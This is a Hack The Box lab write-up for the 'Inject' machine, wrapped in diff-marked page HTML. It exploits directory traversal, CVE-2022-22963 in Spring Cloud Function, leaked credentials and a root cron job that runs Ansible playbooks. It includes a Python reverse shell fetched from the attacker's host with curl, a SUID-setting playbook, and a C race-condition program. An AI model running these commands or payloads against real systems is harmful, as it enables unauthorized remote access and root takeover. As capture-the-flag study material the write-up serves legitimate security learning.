+      function onScroll() {
+        var currentScroll = $window.scrollTop();
+        var h = $('.anchor');
+        var id = "";
+        h.each(function (i, e) {
+          e = $(e);
+          if (e.offset().top - $(window).height()/3 <= currentScroll) {
+            id = e.attr('id');
+          }
+        });
+        var active = $toc.find('a.active');      
+        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
+
+        active.each(function (i, e) {
+           
+            $(e).removeClass('active').siblings('ul').hide();
+          
+        });
+        $toc.find('a[href="#' + id + '"]').addClass('active')
+        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
+          $(e).children('a').parents('ul').show();          
+        });
+      }
+
+      $window.on('scroll', onScroll);
+      $(document).ready(function () {
+         
+          $toc.find('a').parent('li').find('ul').hide();
+        
+        onScroll();
+      });
+    }
+  })();
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>Inject is an easy Linux machine created by <a href="https://app.hackthebox.com/users/396413"   target="_blank">
+    <strong>rajHere</strong></a> on <a href="https://app.hackthebox.com/machines/Inject"   target="_blank">
+    <strong>Hack The Box</strong></a> that involves Exploiting a <strong>Directory Traversal</strong> bug to locate and read local files as <em>frank</em>. We use this vulnerability to enumerate software versions involved in the web server, where we find an outdated Spring Framework installation that is vulnerable to a critical bug tracked as <strong>CVE-2022-22963</strong>. This bug is then used to gain code execution as <em>frank</em>, and find credentials for <em>phil</em> in frank&rsquo;s home directory. The user <em>phil</em> is permitted to write <strong>Ansible</strong> playbooks to a certain directory that is used by <em>root</em> in scheduled <strong>CRON jobs</strong>. With a special playbook, we are then able to execute code as root and fetch the system flag</p>
+
+
+<h2 class="relative group">Initial Recon 
+    <div id="initial-recon" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#initial-recon" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Let&rsquo;s set up our environment and run a TCP port scan with <a href="https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh"   target="_blank">
+    this custom nmap wrapper</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@Kali (bash)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">rhost</span><span class="o">=</span><span class="s2">&#34;10.10.11.204&#34;</span> <span class="c1"># Target IP address</span>
+</span></span><span class="line"><span class="cl"><span class="nv">lhost</span><span class="o">=</span><span class="s2">&#34;10.10.14.4&#34;</span> <span class="c1"># Your VPN IP address</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">rhost</span><span class="o">=</span><span class="nv">$rhost</span> &gt;&gt; .env
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">lhost</span><span class="o">=</span><span class="nv">$lhost</span> &gt;&gt; .env
+</span></span><span class="line"><span class="cl">. ./.env <span class="o">&amp;&amp;</span> ctfscan <span class="nv">$rhost</span>
+</span></span></code></pre></div><p>The open ports reported in the scan include:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Transport</th>
+<th style="text-align:left">Port</th>
+<th style="text-align:left">Service</th>
+<th style="text-align:left">Product</th>
+<th style="text-align:left">Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">TCP</td>
+<td style="text-align:left">22</td>
+<td style="text-align:left">SSH</td>
+<td style="text-align:left">OpenSSH</td>
+<td style="text-align:left">8.2p1 Ubuntu 4ubuntu0.5</td>
+</tr>
+<tr>
+<td style="text-align:left">TCP</td>
+<td style="text-align:left">8080</td>
+<td style="text-align:left">HTTP</td>
+<td style="text-align:left">Nagios NSCA</td>
+<td style="text-align:left"></td>
+</tr>
+</tbody>
+</table>
+
+
+<h2 class="relative group">Web 
+    <div id="web" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#web" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>We&rsquo;ll begin by exploring the HTTP server on port <strong>8080</strong> since web services are often vulnerable.
+Let&rsquo;s also route our requests through our local <a href="https://portswigger.net/burp"   target="_blank">
+    BurpSuite</a> proxy or just use BurpSuite&rsquo;s built-in browser.</p>
+<img src="img/homepage-notes.png">
+<p>The home page introduces a few features including the ability to upload files.
+Let&rsquo;s check out that page since file uploads are a slippery slope when it comes to security.</p>
+<img src="img/upload-page.png">
+<p>We&rsquo;ll try uploading a file in our browser session while we capture the request with BurpSuite.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/upload</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.204:8080</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">220</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundaryAPgIHu4nfmqDyyE2</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">BurpSuite</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">------WebKitFormBoundaryAPgIHu4nfmqDyyE2
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;demo.txt&#34;
+</span></span><span class="line"><span class="cl">Content-Type: text/plain
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">This is a standard UTF-8 text file...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">------WebKitFormBoundaryAPgIHu4nfmqDyyE2--
+</span></span></code></pre></div><img src="img/upload-fail.png">
+<p>The response indicates that the form exclusively accepts image files, so we&rsquo;ll try uploading an image.</p>
+<img src="img/upload-success.png">
+<p>The upload is successful plus we get to view the image dynamically at the <code>/show_image</code> endpoint.</p>
+<img src="img/show-image.png">
+
+
+<h3 class="relative group">File Disclosure 
+    <div id="file-disclosure" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#file-disclosure" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>It appears that the image file is loaded dynamically from the filesystem using the <em>img</em> parameter.
+Let&rsquo;s see if we can read any files outside of our working directory like <code>/etc/passwd</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali (bash)</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://</span><span class="nv">$rhost</span><span class="s2">:8080/show_image?img=../../../../../../etc/passwd&#34;</span>
+</span></span></code></pre></div><blockquote>
+</blockquote>
+<pre tabindex="0"><code>root:.x:0:0:root:/root:/bin/bash
+daemon:.x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:.x:2:2:bin:/bin:/usr/sbin/nologin
+...
+</code></pre><p>We can seemingly use this endpoint to read local files using a generic directory traversal payload.
+Messing around a bit more, we find out that we can list directories as well.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali (bash)</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://</span><span class="nv">$rhost</span><span class="s2">:8080/show_image?img=../../../../../../&#34;</span>
+</span></span></code></pre></div><blockquote>
+</blockquote>
+<pre tabindex="0"><code>bin
+boot
+dev
+...
+</code></pre>
+
+<h3 class="relative group">Remote Code Execution 
+    <div id="remote-code-execution" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#remote-code-execution" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Let&rsquo;s find the application source so we can look for credentials or additional attack surface.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali (bash)</span>
+</span></span><span class="line"><span class="cl">inject_fetch<span class="o">()</span> <span class="o">{</span> curl -sm <span class="m">1</span> <span class="s2">&#34;http://</span><span class="nv">$rhost</span><span class="s2">:8080/show_image?img=&#34;</span><span class="nv">$@</span><span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">inject_fetch ../ <span class="c1"># read parent directory</span>
+</span></span><span class="line"><span class="cl">inject_fetch ../java <span class="c1"># keep looking ...</span>
+</span></span></code></pre></div><p>We eventually find what appears to be the project root for the current Java application at <code>../../../</code>{:.filepath}.
+Within that directory, we find the Maven project configuration at <code>pom.xml</code>{:.filepath} containing a couple of notable software fingerprints.</p>
+<ul>
+<li>org.springframework.boot <strong>2.6.5</strong></li>
+<li>spring-cloud-function-web <strong>3.2.2</strong></li>
+</ul>
+<p>If we search for vulnerabilities with either fingerprint, we see references to a couple of different CVEs.
+We confirm that <strong>Spring Cloud Function</strong> version <strong>3.2.2</strong> is vulnerable to <strong>CVE-2022-22963</strong> by Checking the <a href="https://www.cvedetails.com/cve/CVE-2022-22963/"   target="_blank">
+    CVEDetails description</a>.</p>
+<blockquote>
+<p>In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources.</p>
+</blockquote>
+<p>There is already a number of proof-of-concept exploits out there, but I decided to create one anyways <a href="https://gist.github.com/bryanmcnulty/65a13e981670d25382c174c679e9dc1f"   target="_blank">
+    here</a>.
+We&rsquo;ll use this program to spawn a reverse shell that answers to a <a href="https://pypi.org/project/pwncat-cs/"   target="_blank">
+    PwnCat</a> listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali (bash)</span>
+</span></span><span class="line"><span class="cl">pwncat-cs -c &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;listen -m linux -H </span><span class="nv">$lhost</span><span class="s2"> 443&#34;</span><span class="o">)</span>
+</span></span></code></pre></div><p>{:.nolineno}</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali (bash)</span>
+</span></span><span class="line"><span class="cl">inject_fetch ../../../../../../usr/bin <span class="p">|</span> grep <span class="s1">&#39;^python&#39;</span> <span class="c1"># python3 is installed</span>
+</span></span><span class="line"><span class="cl"><span class="nv">tmp</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
+</span></span><span class="line"><span class="cl">cat <span class="s">&lt;&lt; EOF &gt; $tmp/index.html
+</span></span></span><span class="line"><span class="cl"><span class="s">import os,pty,socket
+</span></span></span><span class="line"><span class="cl"><span class="s">s=socket.socket()
+</span></span></span><span class="line"><span class="cl"><span class="s">s.connect((&#34;$lhost&#34;,443))
+</span></span></span><span class="line"><span class="cl"><span class="s">[os.dup2(s.fileno(),f)for(f)in(0,1,2)]
+</span></span></span><span class="line"><span class="cl"><span class="s">pty.spawn(&#34;bash&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span><span class="line"><span class="cl">python3 -m http.server --bind <span class="nv">$lhost</span> --directory <span class="nv">$tmp</span> <span class="m">80</span> <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl">python3 CVE-2022-22963.py <span class="s2">&#34;http://</span><span class="nv">$rhost</span><span class="s2">:8080&#34;</span> <span class="s2">&#34;curl </span><span class="nv">$lhost</span><span class="s2"> -o/tmp/_d&#34;</span>
+</span></span><span class="line"><span class="cl">python3 CVE-2022-22963.py <span class="s2">&#34;http://</span><span class="nv">$rhost</span><span class="s2">:8080&#34;</span> <span class="s2">&#34;python3 /tmp/_d&#34;</span>
+</span></span></code></pre></div><p>We should then get a callback to our listener on port 443 as the user <em>frank</em>.</p>
+
+
+<h2 class="relative group">Privilege Escalation 
+    <div id="privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#privilege-escalation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Frank 
+    <div id="frank" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#frank" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>We begin exploring the filesystem starting with frank&rsquo;s home directory</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># frank@inject (bash)</span>
+</span></span><span class="line"><span class="cl">find ~ -type f
+</span></span></code></pre></div><blockquote>
+</blockquote>
+<pre tabindex="0"><code>/home/frank/.bashrc
+/home/frank/.m2/settings.xml
+...
+</code></pre><p>There&rsquo;s a Maven user configuration file at <code>~/.m2/settings.xml</code>{:.filepath} that contains credentials for the user <em>phil</em>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;settings</span> <span class="na">xmlns=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;servers&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;server&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;id&gt;</span>Inject<span class="nt">&lt;/id&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;username&gt;</span>phil<span class="nt">&lt;/username&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;password&gt;</span>DocPhillovestoInject123<span class="nt">&lt;/password&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;privateKey&gt;</span>${user.home}/.ssh/id_dsa<span class="nt">&lt;/privateKey&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;filePermissions&gt;</span>660<span class="nt">&lt;/filePermissions&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;directoryPermissions&gt;</span>660<span class="nt">&lt;/directoryPermissions&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;configuration&gt;&lt;/configuration&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/server&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/servers&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/settings&gt;</span>
+</span></span></code></pre></div>
+
+<h3 class="relative group">Phil 
+    <div id="phil" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#phil" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>We&rsquo;ll login as <em>phil</em> with <code>su</code> using the password <strong>DocPhillovestoInject123</strong>, grab the user flag, then run some simple enumeration commands.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># phil@inject (bash)</span>
+</span></span><span class="line"><span class="cl">sudo -l <span class="c1"># no luck :(</span>
+</span></span><span class="line"><span class="cl">id <span class="c1"># staff group?</span>
+</span></span></code></pre></div><p>With the <code>id</code> command, find that <em>phil</em> has membership in a custom group called <strong>staff</strong>.
+Let&rsquo;s see if this group has any special permissions on the filesystem.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># phil@inject (bash)</span>
+</span></span><span class="line"><span class="cl">find / -group staff -ls 2&gt;/dev/null
+</span></span></code></pre></div><p>The most notable entry is the <code>/opt/automation/tasks</code>{:.nolineno} directory which grants write privileges to the staff group.
+Within that folder there is a read-only configuration file (playbook) for an IT automation framework known as <strong>Ansible</strong>.
+Since this has to do with automation, we suspect that there is a CRON job or something similar that utilizes this folder at certain intervals.
+We&rsquo;ll use <a href="https://github.com/DominicBreuker/pspy"   target="_blank">
+    PSpy</a> to monitor processes and find scheduled tasks.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mhil4ne@kali (PwnCat phil@inject)</span>
+</span></span><span class="line"><span class="cl">upload pspy /home/phil
+</span></span></code></pre></div><p>{:.nolineno}</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># phil@inject (bash)</span>
+</span></span><span class="line"><span class="cl">chmod +x pspy <span class="o">&amp;&amp;</span> ./pspy <span class="p">|</span> tee -a pspy.log
+</span></span></code></pre></div><p>After a couple minutes, we find a series of privileged processes running every two minutes that interact with <code>/opt/automation/tasks</code>{:.filepath} in a potentially unsafe manner.</p>
+<ol>
+<li><code>/usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</code>
+<ul>
+<li><code>/usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml</code></li>
+</ul>
+</li>
+<li>
+<ul>
+<li><code>sleep 10</code></li>
+<li><code>/usr/bin/rm -rf /opt/automation/tasks/*</code></li>
+<li><code>/usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/</code></li>
+</ul>
+</li>
+</ol>
+<p>The first process in question evaluates any path satisfying <code>/opt/automation/tasks/*.yml</code>{:.filepath} as an Ansible playbook.
+We should be able to get our playbook evaluated since <code>/opt/automation/tasks</code>{:.filepath} is writable.</p>
+
+
+<h4 class="relative group">Ansible 
+    <div id="ansible" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#ansible" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>It turns out, executing commands in an Ansible playbook is possible and <a href="https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html"   target="_blank">
+    well documented</a>, meaning we should be able to escalate to root this way. We&rsquo;ll just add a task that will grant the SUID bit to <code>/bin/sh</code>{:.filepath}, making sure that we clean up after ourselves to not ruin the box for others.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl">- <span class="nt">hosts</span><span class="p">:</span><span class="w"> </span><span class="l">localhost</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">tasks</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">pwn</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">ansible.builtin.shell</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;chmod +s /bin/sh&#34;</span><span class="w">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># phil@inject (bash)</span>
+</span></span><span class="line"><span class="cl">cat <span class="s">&lt;&lt; EOF &gt; /opt/automation/tasks/pwnbook.yml
+</span></span></span><span class="line"><span class="cl"><span class="s">- hosts: localhost
+</span></span></span><span class="line"><span class="cl"><span class="s">  tasks:
+</span></span></span><span class="line"><span class="cl"><span class="s">  - name: pwn
+</span></span></span><span class="line"><span class="cl"><span class="s">    ansible.builtin.shell: chmod +s /bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span></code></pre></div><p>After a couple minutes we verify that <code>/bin/sh</code>{:.filepath} or <code>/bin/dash</code>{:.filepath} have SUID, then spawn a root shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># phil@inject (bash)</span>
+</span></span><span class="line"><span class="cl">/bin/sh -pi
+</span></span></code></pre></div>
+
+<h4 class="relative group">Alternative Solution (Bonus) 
+    <div id="alternative-solution-bonus" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#alternative-solution-bonus" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>Let&rsquo;s pretend that the magical wildcard used to execute our own playbook didn&rsquo;t exist.
+Even without this, we can solve this machine by abusing a race condition in a CRON job.
+See, every two minutes <em>root</em> evaluates the playbook at <code>/opt/automation/tasks/playbook_1.yml</code>{:.filepath} alongside the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sleep <span class="m">10</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">  rm -rf /opt/automation/tasks/* <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">  cp /root/playbook_1.yml /opt/automation/tasks/
+</span></span></code></pre></div><p>{:.nolineno}</p>
+<pre tabindex="0"><code class="language-mermaid" data-lang="mermaid"> gantt
+  dateFormat mm:ss
+  axisFormat %M:%S
+  tickInterval 2minute
+  title Process creation flow
+  section CRON Job
+  Run playbook : crit, milestone, p1, 00:00, 0s
+  Sleep : p2, 00:00, 10s
+  Remove playbooks : milestone, p3, 00:10, 0s
+  Copy original playbook to tasks folder : milestone, p4, 00:10, 0s
+  CRON Wait : w, 00:00, 2m
+</code></pre><p>Looking at the timing of the calls from our PSpy log, we notice that the original playbook is deleted then replaced within under a second.
+It turns out, we can actually use the time between these actions to entirely prevent the playbook from being replaced.
+We do this by creating a <strong>directory</strong> at <code>/opt/automation/tasks/playbook_1.yml</code>{:.filepath} while the path is unclaimed.
+When the task attempts to populate that path, it runs into an error since a file cannot overwrite a directory no matter what the permissions are.
+Once the <code>cp</code> command fails, we&rsquo;ll delete the directory and replace it with our malicious playbook, which is then evaluated after a couple minutes.</p>
+<p>We just need to create a speedy compiled program that is efficient enough to time this correctly.
+The following Program should work nicely:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -static ./privesc2.c -o privesc2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define PLAYBOOK_PATH &#34;/opt/automation/tasks/playbook_1.yml&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define PLAYBOOK &#34;- hosts: localhost\n&#34;\
+</span></span></span><span class="line"><span class="cl"><span class="cp">                 &#34;  tasks:\n&#34;\
+</span></span></span><span class="line"><span class="cl"><span class="cp">                 &#34;  - name: pwn\n&#34;\
+</span></span></span><span class="line"><span class="cl"><span class="cp">                 &#34;    ansible.builtin.shell: chmod +s /bin/sh\n&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">replace</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">stat</span> <span class="n">sb</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">stat</span><span class="p">(</span><span class="n">PLAYBOOK_PATH</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sb</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nf">mkdir</span><span class="p">(</span><span class="n">PLAYBOOK_PATH</span><span class="p">,</span> <span class="mo">0700</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Swapped with directory!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Fail!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">sleep</span><span class="p">(</span><span class="mi">110</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">usleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">plant</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">PLAYBOOK_PATH</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">PLAYBOOK</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">replace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;rm -rf /opt/automation/tasks/playbook_1.yml&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">plant</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Done!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Running the compiled executable on the target should replace the file with our malicious playbook after a couple minutes.
+We then wait another couple minutes and run <code>/bin/sh -pi</code> to spawn a root shell.</p>
+
+        </div>
+                
+        
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+      
